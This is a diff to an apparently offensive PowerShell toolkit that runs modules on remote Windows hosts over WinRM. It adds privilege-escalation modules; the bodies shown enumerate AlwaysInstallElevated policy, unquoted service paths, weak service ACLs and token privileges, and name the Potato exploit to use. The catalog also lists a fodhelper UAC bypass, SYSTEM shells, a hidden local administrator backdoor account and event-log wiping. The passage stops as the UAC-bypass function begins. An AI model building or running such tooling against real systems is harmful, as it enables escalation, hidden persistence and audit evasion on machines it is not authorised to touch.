@@ -739,6 +739,14 @@ function Get-ARActionCatalog {
     $items.Add((New-ARAction -Id '601' -Title (Get-ARText 'txt70' 'Get operating system information') -Description (Get-ARText 'txt114' 'Full enumeration of privesc surface and local misconfigurations') -Handler 'Invoke-ARModuleChachi'))
     $items.Add((New-ARAction -Id '602' -Title (Get-ARText 'txt71' 'Search vulnerabilities with Sherlock') -Description (Get-ARText 'txt115' 'Scan the system for known kernel and service vulnerabilities') -Handler 'Invoke-ARModuleSherlock'))
     $items.Add((New-ARAction -Id '603' -Title (Get-ARText 'txt130' 'Privilege escalation audit') -Description (Get-ARText 'txt116' 'Audit services, tasks, permissions and patches for escalation paths') -Handler 'Invoke-ARModulePrivescCheck'))
+    $items.Add((New-ARAction -Id '420' -Title (Get-ARText 'txt209' 'AlwaysInstallElevated') -Description 'Check whether the AlwaysInstallElevated policy lets the current user install a package as SYSTEM' -Handler 'Invoke-ARModuleAlwaysInstallElevated' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '421' -Title (Get-ARText 'txt210' 'Unquoted service paths') -Description 'List services whose unquoted binary path sits under a folder the current user can write' -Handler 'Invoke-ARModuleUnquotedServicePath' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '422' -Title (Get-ARText 'txt211' 'Service permissions') -Description 'Show which services this user can reconfigure, restart or take ownership of' -Handler 'Invoke-ARModuleServicePermissions' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '423' -Title (Get-ARText 'txt212' 'Potato check') -Description 'Report whether SeImpersonate or SeAssignPrimaryToken is held and a Potato attack is viable' -Handler 'Invoke-ARModulePotatoCheck' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '424' -Title (Get-ARText 'txt213' 'UAC bypass (fodhelper)') -Description 'Hijack the fodhelper.exe registry key so a command runs elevated without a prompt' -Handler 'Invoke-ARModuleUacBypass' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '425' -Title (Get-ARText 'txt214' 'Run as SYSTEM (task)') -Description 'Register a scheduled task running as SYSTEM and open a shell through it' -Handler 'Invoke-ARModuleSystemTask' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '426' -Title (Get-ARText 'txt215' 'Run as SYSTEM (service)') -Description 'Create a LocalSystem service and start a process as SYSTEM in session 0' -Handler 'Invoke-ARModuleSystemService' -NeedsSession $false))
+    $items.Add((New-ARAction -Id '427' -Title (Get-ARText 'txt216' 'Backdoor account') -Description 'Create a local administrator account hidden from the logon screen' -Handler 'Invoke-ARModuleBackdoorAccount' -NeedsSession $false))
 
     $items.Add((New-ARGroup -Title (Get-ARText 'txt69' 'Other modules') -Description (Get-ARText 'txt145' 'Logs, VNC, external scripts and user switching')))
     $items.Add((New-ARAction -Id '701' -Title (Get-ARText 'txt18' 'Deactivate system logs') -Description (Get-ARText 'txt117' 'Wipe event logs without stopping the EventLog service') -Handler 'Invoke-ARModulePhant0m'))
@@ -7579,6 +7587,1220 @@ function Invoke-ARModulePatchAudit {
     if ($other.Count -gt 0) { Write-ARInfo ('Other updates: ' + [string]$other.Count + ' (not printed; the category map only covers landmark KBs).') }
     Write-ARInfo 'Read-only: the update inventory was only read.'
     Set-ARStatus 'Patch audit complete' 'Ok'
+}
+
+function Invoke-ARModuleAlwaysInstallElevated {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'AlwaysInstallElevated policy check'
+    $session = Get-ARTargetSession
+    $relativePaths = @(
+        'SOFTWARE\Policies\Microsoft\Windows\Installer',
+        'SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\Installer'
+    )
+    $result = Invoke-ARRemote -Session $session -ArgumentList $relativePaths -ScriptBlock {
+        param($paths)
+        $rows = New-Object System.Collections.Generic.List[object]
+        $hives = @(
+            @('HKLM', [Microsoft.Win32.Registry]::LocalMachine),
+            @('HKCU', [Microsoft.Win32.Registry]::CurrentUser)
+        )
+        foreach ($hive in $hives) {
+            foreach ($relative in $paths) {
+                $key = $null
+                try { $key = $hive[1].OpenSubKey([string]$relative) } catch { }
+                $raw = $null
+                if ($null -ne $key) {
+                    try { $raw = $key.GetValue('AlwaysInstallElevated', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames) }
+                    catch { }
+                    $key.Close()
+                }
+                $state = 'not set'
+                if ($null -ne $raw) {
+                    if ([string]$raw -eq '1') { $state = 'enabled' }
+                    else { $state = ('set to ' + [string]$raw) }
+                }
+                $rows.Add([pscustomobject]@{
+                    Hive  = [string]$hive[0]
+                    Path  = ([string]$hive[0] + '\' + [string]$relative)
+                    Value = $state
+                    On    = ($state -eq 'enabled')
+                })
+            }
+        }
+        $machineOn = $false
+        $userOn = $false
+        foreach ($row in $rows) {
+            if (-not $row.On) { continue }
+            if ($row.Hive -eq 'HKLM') { $machineOn = $true }
+            else { $userOn = $true }
+        }
+        return [pscustomobject]@{
+            Rows      = @($rows.ToArray())
+            MachineOn = $machineOn
+            UserOn    = $userOn
+        }
+    }
+    $rows = @($result.Rows)
+    Show-ARText ($rows | Format-Table Hive, Value, Path -AutoSize -Wrap)
+    $exploitable = ([bool]$result.MachineOn -and [bool]$result.UserOn)
+    if ($exploitable) {
+        Write-ARWarn 'AlwaysInstallElevated is enabled in both HKLM and HKCU: an MSI run by this account installs with SYSTEM rights.'
+        Write-ARInfo 'Any signed or unsigned MSI becomes a privilege-escalation path; the policy applies to the whole machine, not just this user.'
+    }
+    elseif ([bool]$result.MachineOn -or [bool]$result.UserOn) {
+        $missing = 'HKCU'
+        if (-not [bool]$result.MachineOn) { $missing = 'HKLM' }
+        Write-ARInfo ('The policy is only half set: ' + $missing + ' is not enabled, so Windows ignores it and an MSI installs with the caller token.')
+    }
+    else { Write-ARInfo 'AlwaysInstallElevated is not configured: an MSI installs with the caller token.' }
+    Write-ARInfo 'Read-only: both policy keys were read, never written.'
+    Set-ARStatus 'AlwaysInstallElevated checked' 'Ok'
+}
+
+function Invoke-ARModuleUnquotedServicePath {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Unquoted service path check'
+    $session = Get-ARTargetSession
+    $result = Invoke-ARRemote -Session $session -ScriptBlock {
+        $cap = 2000
+        $directoryCap = 300
+        $candidateCap = 12
+        $rows = New-Object System.Collections.Generic.List[object]
+        $truncated = New-Object System.Collections.Generic.List[string]
+
+        function Test-ARBroadWriteAcl {
+            param([string]$Directory)
+            try {
+                $acl = Get-Acl -LiteralPath $Directory -ErrorAction Stop
+                foreach ($rule in @($acl.Access | Select-Object -First 512)) {
+                    if ($rule.AccessControlType -ne 'Allow') { continue }
+                    $identity = [string]$rule.IdentityReference
+                    if ($identity -notmatch '(?i)^(Everyone|BUILTIN\\Users|NT AUTHORITY\\Authenticated Users|S-1-1-0|S-1-5-32-545|S-1-5-11)$') { continue }
+                    if ([string]$rule.FileSystemRights -match '(?i)(Write|Modify|FullControl|CreateFiles|AppendData)') { return $true }
+                }
+                return $false
+            }
+            catch { return $false }
+        }
+
+        # Get-Acl over some system directories fails with access denied even for an
+        # administrator (C:\Windows\Temp is the measured case), so the classic
+        # writable locations answer for themselves instead of failing the action.
+        $knownWritable = New-Object System.Collections.Generic.List[string]
+        foreach ($known in @(
+                ($env:SystemRoot + '\Temp'),
+                ($env:SystemDrive + '\Temp'),
+                ($env:SystemDrive + '\Users\Public'),
+                $env:ProgramData)) {
+            $normalized = ([Environment]::ExpandEnvironmentVariables([string]$known)).TrimEnd('\')
+            if ($normalized -ne '' -and -not $knownWritable.Contains($normalized.ToLowerInvariant())) { $knownWritable.Add($normalized.ToLowerInvariant()) }
+        }
+
+        $directoryCache = @{}
+        $directoriesChecked = 0
+        $directoriesTruncated = $false
+        $rowsTruncated = $false
+        $services = @(Get-CimInstance -ClassName Win32_Service -ErrorAction Stop | Select-Object -First ($cap + 1))
+        if ($services.Count -gt $cap) { $services = @($services | Select-Object -First $cap); $truncated.Add('services') }
+        foreach ($service in $services) {
+            if ($rowsTruncated) { break }
+            $pathName = [string]$service.PathName
+            if ([string]::IsNullOrWhiteSpace($pathName)) { continue }
+            # Several binaries can share one ImagePath; the SCM only resolves the first.
+            $text = ([string]($pathName.Trim() -split ',')[0]).Trim()
+            if ($text.StartsWith('"')) { continue }
+            if ($text -notmatch '\s') { continue }
+            # A first token that already ends in .exe resolves whole: nothing to hijack.
+            if ($text -match '^(?i)[^\s]+\.exe(\s|$)') { continue }
+            $segments = @($text -split '\s+' | Where-Object { $_ -ne '' })
+            if ($segments.Count -lt 2) { continue }
+            $candidates = New-Object System.Collections.Generic.List[string]
+            for ($index = 1; $index -le $segments.Count; $index++) {
+                $prefix = (@($segments[0..($index - 1)]) -join ' ')
+                if ($prefix -match '(?i)\.exe$') { break }
+                $candidate = $prefix + '.exe'
+                if (-not $candidates.Contains($candidate)) { $candidates.Add($candidate) }
+                if ($candidates.Count -ge $candidateCap) { break }
+            }
+            foreach ($candidate in $candidates) {
+                $directory = ''
+                try { $directory = [System.IO.Path]::GetDirectoryName($candidate) } catch { $directory = '' }
+                $exists = $false
+                try { $exists = Test-Path -LiteralPath $candidate -PathType Leaf } catch { $exists = $false }
+                $writable = $false
+                if (-not [string]::IsNullOrWhiteSpace($directory)) {
+                    $normalized = $directory.TrimEnd('\')
+                    $cacheKey = $normalized.ToLowerInvariant()
+                    if ($directoryCache.ContainsKey($cacheKey)) { $writable = [bool]$directoryCache[$cacheKey] }
+                    elseif ($directoriesChecked -ge $directoryCap) { $directoriesTruncated = $true }
+                    else {
+                        $directoriesChecked++
+                        if (-not (Test-Path -LiteralPath $normalized)) { $writable = $false }
+                        elseif (Test-ARBroadWriteAcl -Directory $normalized) { $writable = $true }
+                        elseif ($knownWritable.Contains($cacheKey)) { $writable = $true }
+                        $directoryCache[$cacheKey] = $writable
+                    }
+                }
+                $rows.Add([pscustomobject]@{
+                    Service     = [string]$service.Name
+                    Account     = [string]$service.StartName
+                    Candidate   = $candidate
+                    Directory   = $directory
+                    WritableDir = $writable
+                    FileExists  = $exists
+                    Path        = $pathName
+                })
+                if ($rows.Count -ge $cap) { $rowsTruncated = $true; $truncated.Add('candidates'); break }
+            }
+        }
+        if ($directoriesTruncated) { $truncated.Add('directory ACL checks (first 300 unique directories only)') }
+        return [pscustomobject]@{
+            Rows      = @($rows.ToArray())
+            Truncated = @($truncated.ToArray())
+        }
+    }
+    $rows = @($result.Rows)
+    foreach ($item in @($result.Truncated)) { Write-ARWarn ('Collection capped: ' + [string]$item) }
+    if ($rows.Count -eq 0) {
+        Write-ARInfo 'No service has an unquoted ImagePath containing a space: there is no path hijack to make.'
+        Set-ARStatus 'Unquoted service paths: nothing found' 'Ok'
+        return
+    }
+    $writable = @($rows | Where-Object { $_.WritableDir })
+    $present = @($rows | Where-Object { $_.FileExists })
+    $flagged = @($rows | Where-Object { $_.WritableDir -or $_.FileExists } | Sort-Object Service, Candidate)
+    Write-ARInfo ('Unquoted paths: ' + [string](@($rows | Select-Object -ExpandProperty Service -Unique).Count) + ' service(s), ' + [string]$rows.Count + ' candidate binary(ies); writable directories: ' + [string]$writable.Count + '; candidate already on disk: ' + [string]$present.Count + '.')
+    if ($flagged.Count -gt 0) {
+        $preview = @($flagged | Select-Object -First 200)
+        Show-ARText ($preview | Format-Table Service, Candidate, WritableDir, FileExists, Account -AutoSize -Wrap)
+        if ($flagged.Count -gt $preview.Count) { Write-ARInfo ('Only the first 200 of ' + [string]$flagged.Count + ' exploitable candidates are printed.') }
+        Write-ARWarn 'A writable directory above the real binary lets the current user drop the missing .exe and inherit the service account on restart.'
+        Write-ARWarn 'A candidate already on disk is a staged hijack: check its signature and creation time before trusting it.'
+    }
+    else {
+        $plain = @($rows | Sort-Object Service, Candidate | Select-Object -First 60)
+        Show-ARText ($plain | Format-Table Service, Candidate, WritableDir, Directory -AutoSize -Wrap)
+        Write-ARInfo 'No candidate directory allows broad writes and no candidate file exists, so the unquoted paths are cosmetic here.'
+    }
+    Write-ARInfo 'Read-only: service configuration and directory ACLs were read, nothing was written.'
+    Set-ARStatus 'Unquoted service paths checked' 'Ok'
+}
+
+function Invoke-ARModuleServicePermissions {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Service permission check'
+    $session = Get-ARTargetSession
+    $result = Invoke-ARRemote -Session $session -ScriptBlock {
+        $cap = 2000
+        $scCap = 100
+        $rows = New-Object System.Collections.Generic.List[object]
+        $notes = New-Object System.Collections.Generic.List[string]
+
+        function ConvertFrom-ARSddlRights {
+            param([string]$Rights)
+            $mask = [int64]0
+            $unknown = New-Object System.Collections.Generic.List[string]
+            $text = ([string]$Rights).Trim().ToUpperInvariant()
+            $index = 0
+            while ($index + 1 -lt $text.Length) {
+                $token = $text.Substring($index, 2)
+                $index += 2
+                switch ($token) {
+                    'CC' { $mask = $mask -bor [int64]1 }
+                    'DC' { $mask = $mask -bor [int64]2 }
+                    'LC' { $mask = $mask -bor [int64]4 }
+                    'SW' { $mask = $mask -bor [int64]8 }
+                    'RP' { $mask = $mask -bor [int64]16 }
+                    'WP' { $mask = $mask -bor [int64]32 }
+                    'DT' { $mask = $mask -bor [int64]64 }
+                    'LO' { $mask = $mask -bor [int64]128 }
+                    'CR' { $mask = $mask -bor [int64]256 }
+                    'SD' { $mask = $mask -bor [int64]65536 }
+                    'RC' { $mask = $mask -bor [int64]131072 }
+                    'WD' { $mask = $mask -bor [int64]262144 }
+                    'WO' { $mask = $mask -bor [int64]524288 }
+                    'GA' { $mask = $mask -bor [int64]268435456 }
+                    'GX' { $mask = $mask -bor [int64]536870912 }
+                    'GW' { $mask = $mask -bor [int64]1073741824 }
+                    'GR' { $mask = $mask -bor [int64]2147483648 }
+                    'FA' { $mask = $mask -bor [int64]983551 }
+                    default { $unknown.Add($token) }
+                }
+            }
+            return [pscustomobject]@{ Mask = $mask; Unknown = @($unknown.ToArray()) }
+        }
+
+        function Get-ARServiceRightNames {
+            param([int64]$Mask)
+            if (($Mask -band [int64]268435456) -ne 0) { return 'GENERIC_ALL' }
+            $names = New-Object System.Collections.Generic.List[string]
+            $map = @(
+                @('QUERY_CONFIG', [int64]1),
+                @('CHANGE_CONFIG', [int64]2),
+                @('QUERY_STATUS', [int64]4),
+                @('ENUMERATE_DEPENDENTS', [int64]8),
+                @('START', [int64]16),
+                @('STOP', [int64]32),
+                @('PAUSE_CONTINUE', [int64]64),
+                @('INTERROGATE', [int64]128),
+                @('USER_DEFINED_CONTROL', [int64]256),
+                @('DELETE', [int64]65536),
+                @('READ_CONTROL', [int64]131072),
+                @('WRITE_DAC', [int64]262144),
+                @('WRITE_OWNER', [int64]524288)
+            )
+            foreach ($entry in $map) {
+                if (($Mask -band [int64]$entry[1]) -ne 0) { $names.Add([string]$entry[0]) }
+            }
+            if (($Mask -band [int64]1073741824) -ne 0) { $names.Add('GENERIC_WRITE') }
+            if (($Mask -band [int64]536870912) -ne 0) { $names.Add('GENERIC_EXECUTE') }
+            if (($Mask -band [int64]2147483648) -ne 0) { $names.Add('GENERIC_READ') }
+            if ($names.Count -eq 0) { return 'none' }
+            return ($names -join '|')
+        }
+
+        $broadAliases = @('WD', 'BU', 'AU', 'IU', 'SU', 'CO', 'AN', 'BG', 'LS', 'NS')
+        $broadSids = @('S-1-1-0', 'S-1-5-11', 'S-1-5-4', 'S-1-5-7', 'S-1-5-6', 'S-1-5-32-545', 'S-1-5-32-546')
+        $aliasNames = @{
+            'WD' = 'Everyone'
+            'BU' = 'BUILTIN\Users'
+            'AU' = 'NT AUTHORITY\Authenticated Users'
+            'IU' = 'NT AUTHORITY\INTERACTIVE'
+            'SU' = 'NT AUTHORITY\SERVICE'
+            'CO' = 'CREATOR OWNER'
+            'AN' = 'NT AUTHORITY\ANONYMOUS LOGON'
+            'BG' = 'BUILTIN\Guests'
+            'LS' = 'NT AUTHORITY\LOCAL SERVICE'
+            'NS' = 'NT AUTHORITY\NETWORK SERVICE'
+        }
+
+        $services = @(Get-CimInstance -ClassName Win32_Service -ErrorAction Stop | Select-Object -First ($cap + 1))
+        if ($services.Count -gt $cap) { $services = @($services | Select-Object -First $cap) }
+        $unquoted = New-Object System.Collections.Generic.List[string]
+        foreach ($service in $services) {
+            $pathName = [string]$service.PathName
+            if ([string]::IsNullOrWhiteSpace($pathName)) { continue }
+            $text = ([string]($pathName.Trim() -split ',')[0]).Trim()
+            if ($text.StartsWith('"')) { continue }
+            if ($text -notmatch '\s') { continue }
+            if ($text -match '^(?i)[^\s]+\.exe(\s|$)') { continue }
+            $unquoted.Add([string]$service.Name)
+        }
+        $candidates = @($unquoted.ToArray())
+        $scope = 'services with an unquoted path'
+        if ($candidates.Count -eq 0) {
+            $scope = 'the first 40 services (none has an unquoted path)'
+            $candidates = @($services | Select-Object -First 40 | ForEach-Object { [string]$_.Name })
+        }
+        if ($candidates.Count -gt $scCap) {
+            $notes.Add('sc sdshow capped at 100 services (' + [string]$candidates.Count + ' were in scope)')
+            $candidates = @($candidates | Select-Object -First $scCap)
+        }
+        foreach ($name in $candidates) {
+            $sddl = ''
+            $exitCode = 0
+            try {
+                $sddl = [string](& sc.exe sdshow $name 2>&1 | Out-String)
+                $exitCode = $LASTEXITCODE
+            }
+            catch {
+                $notes.Add([string]$name + ': sc sdshow failed (' + $_.Exception.Message + ')')
+                continue
+            }
+            if ($exitCode -ne 0 -or $sddl -notmatch 'D:') {
+                $notes.Add([string]$name + ': sc sdshow returned no SDDL (exit ' + [string]$exitCode + ')')
+                continue
+            }
+            # Indexing a one-line result would yield a char, not a string.
+            $sddlLines = @(@($sddl -split "`r?`n") | Where-Object { $_ -match 'D:' })
+            if ($sddlLines.Count -gt 0) { $sddl = ([string]$sddlLines[0]).Trim() }
+            $allow = @{}
+            $deny = @{}
+            $label = @{}
+            foreach ($match in [regex]::Matches($sddl, '\(([^)]*)\)')) {
+                $fields = $match.Groups[1].Value -split ';'
+                if ($fields.Count -lt 6) { continue }
+                $type = ([string]$fields[0]).Trim().ToUpperInvariant()
+                if ($type -ne 'A' -and $type -ne 'D') { continue }
+                $flags = ([string]$fields[1]).Trim().ToUpperInvariant()
+                # Inherit-only ACEs do not apply to the object itself.
+                if ($flags.Contains('IO') -or $flags.Contains('ID')) { continue }
+                $sid = ([string]$fields[5]).Trim()
+                if ([string]::IsNullOrWhiteSpace($sid)) { continue }
+                $key = $sid.ToUpperInvariant()
+                $broad = $false
+                if ($broadAliases -contains $key) { $broad = $true }
+                if ($broadSids -contains $key) { $broad = $true }
+                if (-not $broad) { continue }
+                $decoded = ConvertFrom-ARSddlRights -Rights ([string]$fields[2])
+                foreach ($token in @($decoded.Unknown)) { $notes.Add([string]$name + ': unknown SDDL right "' + [string]$token + '"') }
+                if ($type -eq 'A') {
+                    if ($allow.ContainsKey($key)) { $allow[$key] = [int64]$allow[$key] -bor [int64]$decoded.Mask }
+                    else { $allow[$key] = [int64]$decoded.Mask }
+                    if (-not $label.ContainsKey($key)) {
+                        $display = $sid
+                        if ($aliasNames.ContainsKey($key)) { $display = [string]$aliasNames[$key] }
+                        else {
+                            try { $display = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value }
+                            catch { $display = $sid }
+                        }
+                        $label[$key] = $display
+                    }
+                }
+                else {
+                    if ($deny.ContainsKey($key)) { $deny[$key] = [int64]$deny[$key] -bor [int64]$decoded.Mask }
+                    else { $deny[$key] = [int64]$decoded.Mask }
+                }
+            }
+            foreach ($key in @($allow.Keys)) {
+                $effective = [int64]$allow[$key]
+                if ($deny.ContainsKey($key)) { $effective = $effective -band (-bnot [int64]$deny[$key]) }
+                if ($effective -eq 0) { continue }
+                $reconfigure = $false
+                if (($effective -band [int64]2) -ne 0) { $reconfigure = $true }
+                if (($effective -band [int64]262144) -ne 0) { $reconfigure = $true }
+                if (($effective -band [int64]524288) -ne 0) { $reconfigure = $true }
+                if (($effective -band [int64]1073741824) -ne 0) { $reconfigure = $true }
+                if (($effective -band [int64]268435456) -ne 0) { $reconfigure = $true }
+                $rows.Add([pscustomobject]@{
+                    Service     = [string]$name
+                    Principal   = [string]$label[$key]
+                    Access      = (Get-ARServiceRightNames -Mask $effective)
+                    Reconfigure = $reconfigure
+                    Start       = (($effective -band [int64]16) -ne 0)
+                    Stop        = (($effective -band [int64]32) -ne 0)
+                    Delete      = (($effective -band [int64]65536) -ne 0)
+                })
+            }
+        }
+        return [pscustomobject]@{
+            Rows  = @($rows.ToArray())
+            Scope = $scope
+            Notes = @($notes.ToArray())
+        }
+    }
+    $rows = @($result.Rows)
+    foreach ($note in @($result.Notes | Select-Object -First 40)) { Write-ARInfo ([string]$note) }
+    Write-ARInfo ('Scope: ' + [string]$result.Scope + '.')
+    if ($rows.Count -eq 0) {
+        Write-ARInfo 'No non-admin principal holds an explicit allowance on the services in scope.'
+        Set-ARStatus 'Service permissions: nothing flagged' 'Ok'
+        return
+    }
+    $flagged = @($rows | Where-Object { $_.Reconfigure } | Sort-Object Service, Principal)
+    $restart = @($rows | Where-Object { -not $_.Reconfigure -and ($_.Start -or $_.Stop) } | Sort-Object Service, Principal)
+    if ($flagged.Count -gt 0) {
+        $preview = @($flagged | Select-Object -First 200)
+        Show-ARText ($preview | Format-Table Service, Principal, Access, Reconfigure -AutoSize -Wrap)
+        if ($flagged.Count -gt $preview.Count) { Write-ARInfo ('Only the first 200 of ' + [string]$flagged.Count + ' reconfigurable grants are printed.') }
+        Write-ARWarn 'CHANGE_CONFIG, WRITE_DAC or WRITE_OWNER for a non-admin principal turns the service into a SYSTEM execution path: change the binary and restart it.'
+        foreach ($owner in @($flagged | Where-Object { $_.Access -match 'GENERIC_ALL' } | Select-Object -First 10)) {
+            Write-ARWarn ([string]$owner.Service + ' grants GENERIC_ALL to ' + [string]$owner.Principal + '.')
+        }
+        foreach ($item in @($flagged | Where-Object { $_.Delete } | Select-Object -First 10)) {
+            Write-ARInfo ([string]$item.Service + ' also grants DELETE to ' + [string]$item.Principal + '.')
+        }
+    }
+    else { Write-ARInfo 'No non-admin principal can reconfigure the services in scope.' }
+    if ($restart.Count -gt 0) {
+        Show-ARText (@($restart | Select-Object -First 40) | Format-Table Service, Principal, Access -AutoSize -Wrap)
+        Write-ARInfo ('Start/stop only grants: ' + [string]$restart.Count + ' (denial of service, not escalation).')
+    }
+    Write-ARInfo 'Read-only: sdshow only reads the security descriptor of each service.'
+    Set-ARStatus 'Service permissions checked' 'Ok'
+}
+
+function Invoke-ARModulePotatoCheck {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Potato viability check'
+    $session = Get-ARTargetSession
+    $result = Invoke-ARRemote -Session $session -ScriptBlock {
+        $source = @'
+using System;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public static class ARTokenPrivileges
+{
+    [StructLayout(LayoutKind.Sequential)]
+    private struct LUID { public uint LowPart; public int HighPart; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool GetTokenInformation(IntPtr token, int infoClass, IntPtr buffer, int length, out int returned);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    private static extern bool LookupPrivilegeName(string system, ref LUID luid, StringBuilder name, ref int length);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool CloseHandle(IntPtr handle);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetCurrentProcess();
+
+    public static string[] Held()
+    {
+        var result = new List<string>();
+        IntPtr token = IntPtr.Zero;
+        if (!OpenProcessToken(GetCurrentProcess(), 0x0008, out token))
+        {
+            result.Add("!OpenProcessToken:" + Marshal.GetLastWin32Error().ToString());
+            return result.ToArray();
+        }
+        try
+        {
+            int size = 0;
+            GetTokenInformation(token, 3, IntPtr.Zero, 0, out size);
+            if (size <= 0) { result.Add("!GetTokenInformation:" + Marshal.GetLastWin32Error().ToString()); return result.ToArray(); }
+            IntPtr buffer = Marshal.AllocHGlobal(size);
+            try
+            {
+                if (!GetTokenInformation(token, 3, buffer, size, out size))
+                {
+                    result.Add("!GetTokenInformation:" + Marshal.GetLastWin32Error().ToString());
+                    return result.ToArray();
+                }
+                int count = Marshal.ReadInt32(buffer);
+                int offset = 4;
+                int itemSize = Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES));
+                for (int i = 0; i < count; i++)
+                {
+                    object boxed = Marshal.PtrToStructure(new IntPtr(buffer.ToInt64() + offset), typeof(LUID_AND_ATTRIBUTES));
+                    LUID_AND_ATTRIBUTES item = (LUID_AND_ATTRIBUTES)boxed;
+                    var name = new StringBuilder(256);
+                    int length = 256;
+                    if (LookupPrivilegeName(null, ref item.Luid, name, ref length))
+                    {
+                        bool enabled = (item.Attributes & 0x2) != 0;
+                        result.Add(name.ToString() + "|" + (enabled ? "1" : "0"));
+                    }
+                    offset += itemSize;
+                }
+            }
+            finally { Marshal.FreeHGlobal(buffer); }
+        }
+        finally { CloseHandle(token); }
+        return result.ToArray();
+    }
+}
+'@
+        if ($null -eq ('ARTokenPrivileges' -as [type])) {
+            Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop
+        }
+        $privileges = @([ARTokenPrivileges]::Held())
+        $current = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $isSystem = $false
+        $isAdmin = $false
+        try { $isSystem = $current.User.IsWellKnown([System.Security.Principal.WellKnownSidType]::LocalSystemSid) } catch { }
+        try { $isAdmin = (New-Object System.Security.Principal.WindowsPrincipal($current)).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator) } catch { }
+        $os = $null
+        try { $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop } catch { }
+        $build = 0
+        $caption = ''
+        $version = [string][System.Environment]::OSVersion.Version
+        if ($null -ne $os) {
+            [void][int]::TryParse([string]$os.BuildNumber, [ref]$build)
+            $caption = [string]$os.Caption
+            $version = [string]$os.Version
+        }
+        if ($build -le 0) { $build = [System.Environment]::OSVersion.Version.Build }
+        return [pscustomobject]@{
+            Identity   = [string]$current.Name
+            IsSystem   = [bool]$isSystem
+            IsAdmin    = [bool]$isAdmin
+            Build      = [int]$build
+            Caption    = $caption
+            Version    = $version
+            Privileges = @($privileges)
+        }
+    }
+    $privileges = @($result.Privileges)
+    $held = @{}
+    foreach ($line in $privileges) {
+        $text = [string]$line
+        if ($text.StartsWith('!')) { Write-ARWarn ('Token query failed: ' + $text.TrimStart('!')); continue }
+        $parts = $text -split '\|'
+        if ($parts.Count -lt 2) { continue }
+        $held[[string]$parts[0]] = ([string]$parts[1] -eq '1')
+    }
+    Show-ARText ([pscustomobject]@{
+            Identity        = [string]$result.Identity
+            IsSystem        = [bool]$result.IsSystem
+            IsAdministrator = [bool]$result.IsAdmin
+            Build           = [string]$result.Build
+            Caption         = [string]$result.Caption
+            Version         = [string]$result.Version
+        } | Format-List | Out-String)
+    $impersonate = $false
+    $assignPrimary = $false
+    if ($held.ContainsKey('SeImpersonatePrivilege')) {
+        $impersonate = [bool]$held['SeImpersonatePrivilege']
+        Write-ARInfo ('SeImpersonatePrivilege: present, enabled=' + [string]$impersonate)
+    }
+    else { Write-ARWarn 'SeImpersonatePrivilege: not held by this token.' }
+    if ($held.ContainsKey('SeAssignPrimaryTokenPrivilege')) {
+        $assignPrimary = [bool]$held['SeAssignPrimaryTokenPrivilege']
+        Write-ARInfo ('SeAssignPrimaryTokenPrivilege: present, enabled=' + [string]$assignPrimary)
+    }
+    else { Write-ARInfo 'SeAssignPrimaryTokenPrivilege: not held by this token.' }
+    $build = [int]$result.Build
+    if ([bool]$result.IsSystem) {
+        Write-ARInfo 'The token is already SYSTEM: no impersonation step is needed.'
+        Set-ARStatus 'Potato check: already SYSTEM' 'Ok'
+        return
+    }
+    if ($impersonate) {
+        $family = 'GodPotato / EfsPotato (RPC impersonation)'
+        $reason = 'build ' + [string]$build + ' is inside the range where the JuicyPotato CLSIDs and the PrintSpoofer pipe are patched'
+        if ($build -le 17763) {
+            $family = 'JuicyPotato / RottenPotato (CLSID abuse)'
+            $reason = 'build ' + [string]$build + ' still honours the CLSID argument that JuicyPotato needs'
+        }
+        elseif ($build -lt 20348) {
+            $family = 'PrintSpoofer / SweetPotato (named pipe impersonation)'
+            $reason = 'build ' + [string]$build + ' fixed the JuicyPotato CLSIDs, so the spooler named pipe is the road that still works'
+        }
+        Write-ARSuccess ('Applicable family: ' + $family + '.')
+        Write-ARInfo ('Why: ' + $reason + '.')
+        if ($assignPrimary) { Write-ARInfo 'SeAssignPrimaryToken is also held, so the CreateProcessAsUser variants of the same family apply without a second token dance.' }
+        else { Write-ARInfo 'SeAssignPrimaryToken is missing, so stick to the CreateProcessWithToken path (no CreateProcessAsUser).' }
+    }
+    elseif ($assignPrimary) {
+        Write-ARWarn 'Only SeAssignPrimaryTokenPrivilege is held: the create-process step is available but there is no impersonated token to hand it, so the Potato family does not apply on its own.'
+    }
+    else {
+        Write-ARInfo 'Neither privilege is held: no Potato family applies, because the impersonated SYSTEM token cannot be obtained or used.'
+    }
+    Write-ARInfo 'Read-only: the current token and the OS build were queried, nothing was changed.'
+    Set-ARStatus 'Potato check complete' 'Ok'
+}
+
+function Invoke-ARModuleUacBypass {
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'UAC bypass (fodhelper)'
+    $proofPath = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.txt')
